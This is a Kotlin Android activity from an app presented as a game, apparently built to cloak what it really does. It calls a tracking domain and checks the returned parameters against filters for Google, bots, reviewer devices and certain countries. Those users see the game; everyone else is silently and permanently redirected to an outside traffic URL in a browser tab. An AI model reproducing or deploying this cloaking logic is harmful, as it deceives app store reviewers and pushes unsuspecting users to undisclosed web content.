package com.plussy.game.activity

import android.app.Activity
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.browser.customtabs.CustomTabsIntent
import com.plussy.game.data.TrafficApi
import okhttp3.OkHttpClient
import retrofit2.Retrofit
import retrofit2.converter.scalars.ScalarsConverterFactory
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory

class MainActivity : Activity() {

    private val baseUrl = "https://appstrack18.xyz/"
    private val baseResponseUrl = "https://sym2metrybh.xyz/vWnYKdmf"

    private lateinit var pref: SharedPreferences

    private val APP_PREFERENCES = "settings"
    private val APP_PREFERENCES_LAUNCHER = "launcher"

    private val LAUNCHER_GAME = "game"
    private val LAUNCHER_TRAFFIC = "traffic"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        pref = getSharedPreferences(APP_PREFERENCES, MODE_PRIVATE)

        when (pref.getString(APP_PREFERENCES_LAUNCHER, "")) {

            "" -> {
                val conditions = arrayOf(".*(FreeBSD|Firefox|Linux).*".toLowerCase().toRegex(),
                        "".toRegex(),
                        ".*(Nexus|Pixel|Moto).*".toLowerCase().toRegex(),
                        ".*(1).*".toRegex(),
                        ".*(1).*".toRegex(),
                        ".*(AR).*".toLowerCase().toRegex(),
                        ".*(US|PH|IE|NL|GB|IN).*".toLowerCase().toRegex(),
                        "".toRegex(),
                        ".*(google|bot|adwords|rawler|spy|o-http-client|Dalvik/2\\.1\\.0 \\(Linux; U; Android 6\\.0\\.1; Nexus 5X Build/MTC20F\\)|Dalvik/2\\.1\\.0 \\(Linux; U; Android 7\\.0; SM-G935F Build/NRD90M\\)|Dalvik/2\\.1\\.0 \\(Linux; U; Android 7\\.0; WAS-LX1A Build/HUAWEIWAS-LX1A\\)).*".toLowerCase().toRegex())

                val client = OkHttpClient.Builder()
                        .addNetworkInterceptor { chain ->
                            chain.proceed(
                                    chain.request()
                                            .newBuilder()
                                            .header("User-Agent", System.getProperty("http.agent")!!) //for sub9 etc
                                            .build()
                            )
                        }
                        .build()

                val retrofit = Retrofit.Builder()
                        .baseUrl(baseUrl)
                        .client(client)
                        .addConverterFactory(ScalarsConverterFactory.create())
                        .addCallAdapterFactory(RxJava2CallAdapterFactory.create())
                        .build()

                val trafficApi = retrofit.create<TrafficApi>(TrafficApi::class.java)

                trafficApi.getInfo().enqueue(object : Callback<String> {
                    override fun onResponse(call: Call<String>, response: Response<String>) {

                        var url = response.raw().request().url().toString().trim()

                        if (url == baseUrl + "CX67h1bP" || url == baseResponseUrl) {

                            saveStateApp(pref, LAUNCHER_GAME)
                            launchGame()

                        } else {

                            url = url.substring(url.indexOf('?') + 6).replace("%20", " ")
                            val params = url.split("&sub[0-9]=".toRegex())

                            //массив номеров параметров, которые будут проверятся
                            val numbers = mutableListOf<Int>()

                            for (i in params.indices) {
                                if (i != 1 && i != 7 && params[i].isNotEmpty()) {
                                    numbers.add(i)
                                }
                            }

                            var isGame = false

                            //поиск совпадений заданных значений
                            for (i in numbers.indices) {
                                if (params[numbers[i]].toLowerCase().matches(conditions[numbers[i]])) {
                                    isGame = true
                                    Toast.makeText(this@MainActivity, params[numbers[i]], Toast.LENGTH_LONG).show()
                                    break
                                }
                            }

                            if (isGame) {
                                saveStateApp(pref, LAUNCHER_GAME)
                                launchGame()
                            } else {
                                //запуск Chrome Custom Tabs
                                saveStateApp(pref, LAUNCHER_TRAFFIC)
                                launchWebView()
                            }
                        }
                    }

                    override fun onFailure(call: Call<String>, t: Throwable) {
                        saveStateApp(pref, LAUNCHER_GAME)
                        launchGame()
                    }
                })
            }
            LAUNCHER_GAME -> launchGame()
            LAUNCHER_TRAFFIC -> launchWebView()
        }

        finish()
    }

    fun launchGame() {
        val intent = Intent(this, AndroidLauncher::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    fun launchWebView() {
        val urlTraffic = "https://traffidomn.xyz/pYtnMY7B"
        val builder = CustomTabsIntent.Builder()
        val customTabsIntent = builder.build()
        customTabsIntent.intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        customTabsIntent.launchUrl(this, Uri.parse(urlTraffic))
    }

    fun saveStateApp(pref : SharedPreferences, value : String) {
        val editor = pref.edit()
        editor.putString(APP_PREFERENCES_LAUNCHER, value)
        editor.apply()
    }
}